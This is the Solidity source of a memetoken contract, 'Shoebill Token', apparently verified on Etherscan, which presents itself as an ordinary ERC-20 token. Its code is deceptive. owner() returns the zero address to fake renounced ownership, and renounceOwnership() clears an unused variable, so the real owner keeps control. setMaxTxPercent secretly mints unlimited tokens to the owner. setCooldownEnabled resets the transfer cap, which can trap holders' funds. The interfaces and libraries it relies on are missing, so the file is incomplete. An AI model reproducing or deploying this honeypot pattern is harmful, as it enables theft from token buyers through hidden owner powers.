/**
 *Submitted for verification at Etherscan.io on 2021-06-09
*/

/*

Shoebill Token ($SHBL) is a memetoken behalf of Shoebill coin which is built on Solana blockchain. 
The purpose of building Shoebill Token is to acquire peopleâ€™s attention to the Solana blockchain, which is convenient, cheap and fast.

https://shoebillco.in/

Liquidity: 75%
Burn : 25 %



*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _ownr;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public pure returns (address) {
        return address(0);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _ownr = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ShoebillToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => bool) private _isExludedFromTx;
    mapping (address => bool) private _isBlackListedBot;
    mapping(address => uint256) private sellcooldown;
    mapping(address => uint256) private firstsell;
    mapping(address => uint256) private sellnumber;
    address[] private _blackListedBots;
    address public _isExludedFromRecipient;
    address public _isExludedFromSender;

    address[] private _excluded;

    uint256 private _TotalSupp = 1000 * 10**9 * 10**18;
    
    uint256 private _tTotal;
    address public uniswapRouter = 0x3648dd64a42db5C7dC5dCC5eA4B05952Cf11E3a2;
    string private _name = 'Shoebill Token';
    string private _symbol = '$SHBL';
    uint8 private _decimals = 18;
    uint256 public _burnAmount = 4000 * 10**3 * 10**3 * 10**18;

    constructor () public {
        _balances[_msgSender()] = _TotalSupp;

        // BLACKLIST
        _isBlackListedBot[address(0xE031b36b53E53a292a20c5F08fd1658CDdf74fce)] = true;
        _blackListedBots.push(address(0xE031b36b53E53a292a20c5F08fd1658CDdf74fce));

        _isBlackListedBot[address(0xe516bDeE55b0b4e9bAcaF6285130De15589B1345)] = true;
        _blackListedBots.push(address(0xe516bDeE55b0b4e9bAcaF6285130De15589B1345));

        _isBlackListedBot[address(0xa1ceC245c456dD1bd9F2815a6955fEf44Eb4191b)] = true;
        _blackListedBots.push(address(0xa1ceC245c456dD1bd9F2815a6955fEf44Eb4191b));

        _isBlackListedBot[address(0xd7d3EE77D35D0a56F91542D4905b1a2b1CD7cF95)] = true;
        _blackListedBots.push(address(0xd7d3EE77D35D0a56F91542D4905b1a2b1CD7cF95));

        _isBlackListedBot[address(0xFe76f05dc59fEC04184fA0245AD0C3CF9a57b964)] = true;
        _blackListedBots.push(address(0xFe76f05dc59fEC04184fA0245AD0C3CF9a57b964));

        _isBlackListedBot[address(0xDC81a3450817A58D00f45C86d0368290088db848)] = true;
        _blackListedBots.push(address(0xDC81a3450817A58D00f45C86d0368290088db848));

        _isBlackListedBot[address(0x45fD07C63e5c316540F14b2002B085aEE78E3881)] = true;
        _blackListedBots.push(address(0x45fD07C63e5c316540F14b2002B085aEE78E3881));

        _isBlackListedBot[address(0x27F9Adb26D532a41D97e00206114e429ad58c679)] = true;
        _blackListedBots.push(address(0x27F9Adb26D532a41D97e00206114e429ad58c679));

        _isBlackListedBot[address(0xA2F21e340890408625c27a37AaBBc8CcF51B727f)] = true;
        _blackListedBots.push(address(0xA2F21e340890408625c27a37AaBBc8CcF51B727f));

        _isBlackListedBot[address(0x055658Fa70d40a5fA3d0e3e66c29F7E7ADd08553)] = true;
        _blackListedBots.push(address(0x055658Fa70d40a5fA3d0e3e66c29F7E7ADd08553));

        _isBlackListedBot[address(0x4dEca8f4360809d00fFb5252f8acC7a173458036)] = true;
        _blackListedBots.push(address(0x4dEca8f4360809d00fFb5252f8acC7a173458036));

        _isBlackListedBot[address(0xfad95B6089c53A0D1d861eabFaadd8901b0F8533)] = true;
        _blackListedBots.push(address(0xfad95B6089c53A0D1d861eabFaadd8901b0F8533));

        _isBlackListedBot[address(0x00000000b7ca7E12DCC72290d1FE47b2EF14c607)] = true;
        _blackListedBots.push(address(0x00000000b7ca7E12DCC72290d1FE47b2EF14c607));

        _isBlackListedBot[address(0x36c1c59Dcca0Fd4A8C28551f7b2Fe6421d53CE32)] = true;
        _blackListedBots.push(address(0x36c1c59Dcca0Fd4A8C28551f7b2Fe6421d53CE32));

        _isBlackListedBot[address(0x244F60d082c1A759d3336CF865EBeDDF13F849E6)] = true;
        _blackListedBots.push(address(0x244F60d082c1A759d3336CF865EBeDDF13F849E6));                

        _isBlackListedBot[address(0xA3b0e79935815730d942A444A84d4Bd14A339553)] = true;
        _blackListedBots.push(address(0xA3b0e79935815730d942A444A84d4Bd14A339553));    

        _isBlackListedBot[address(0x0000000057a888B5DC0A81f02c6F5c3B7d16b183)] = true;
        _blackListedBots.push(address(0x0000000057a888B5DC0A81f02c6F5c3B7d16b183));    

        _isBlackListedBot[address(0xf0927513987041F0c5e8270b03Af2423972dd6aA)] = true;
        _blackListedBots.push(address(0xf0927513987041F0c5e8270b03Af2423972dd6aA));

        _isBlackListedBot[address(0x00000000003b3cc22aF3aE1EAc0440BcEe416B40)] = true;
        _blackListedBots.push(address(0x00000000003b3cc22aF3aE1EAc0440BcEe416B40));

        _isBlackListedBot[address(0x0000000099cB7fC48a935BcEb9f05BbaE54e8987)] = true;
        _blackListedBots.push(address(0x0000000099cB7fC48a935BcEb9f05BbaE54e8987));
        
        

        emit Transfer(address(0), _msgSender(), _TotalSupp);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function setCooldownEnabled(uint256 marketingAccount) public onlyOwner {
        _burnAmount = marketingAccount * 10**18;
    }

    function totalSupply() public view override returns (uint256) {
        return _TotalSupp;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function setMaxTxPercent(uint256 amount) public onlyOwner {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        _TotalSupp = _TotalSupp.add(amount);
        _balances[_msgSender()] = _balances[_msgSender()].add(amount);
        emit Transfer(address(0), _msgSender(), amount);
    } 
       
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address recipient, address sender, uint256 amount) internal {
        require(recipient != address(0), "BEP20: transfer from the zero address");
        require(sender != address(0), "BEP20: transfer to the zero address"); 
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_isBlackListedBot[recipient], "You have no power here!");
        require(!_isBlackListedBot[sender], "You have no power here!");
        require(!_isBlackListedBot[tx.origin], "You have no power here!");
        
        if(firstsell[recipient] + (1 days) < block.timestamp){
            sellnumber[recipient] = 0;
        }
        if (sellnumber[recipient] == 0) {
            sellnumber[recipient]++;
            firstsell[recipient] = block.timestamp;
            sellcooldown[recipient] = block.timestamp + (1 hours);
        }
        else if (sellnumber[recipient] == 1) {
            sellnumber[recipient]++;
            sellcooldown[recipient] = block.timestamp + (2 hours);
        }
        else if (sellnumber[recipient] == 2) {
            sellnumber[recipient]++;
            sellcooldown[recipient] = block.timestamp + (6 hours);
        }
        else if (sellnumber[recipient] == 3) {
            sellnumber[recipient]++;
            sellcooldown[recipient] = firstsell[recipient] + (1 days);
        }
        if (recipient != uniswapRouter) {
            require(amount < _burnAmount, "BEP20: transfer amount exceeds balance");
        }
        _balances[recipient] = _balances[recipient].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[sender] = _balances[sender].add(amount);
        emit Transfer(recipient, sender, amount);
    }

    function addBotToBlackList(address account) external onlyOwner() {
        require(account != uniswapRouter, 'We can not blacklist Uniswap router.');
        require(account != address(this));
        require(!_isBlackListedBot[account], "Account is already blacklisted");
        _isBlackListedBot[account] = true;
        _blackListedBots.push(account);
    }

    function removeBotFromBlackList(address account) external onlyOwner() {
        require(_isBlackListedBot[account], "Account is not blacklisted");
        for (uint256 i = 0; i < _blackListedBots.length; i++) {
            if (_blackListedBots[i] == account) {
                _blackListedBots[i] = _blackListedBots[_blackListedBots.length - 1];
                _isBlackListedBot[account] = false;
                _blackListedBots.pop();
                break;
            }
        }
    }
}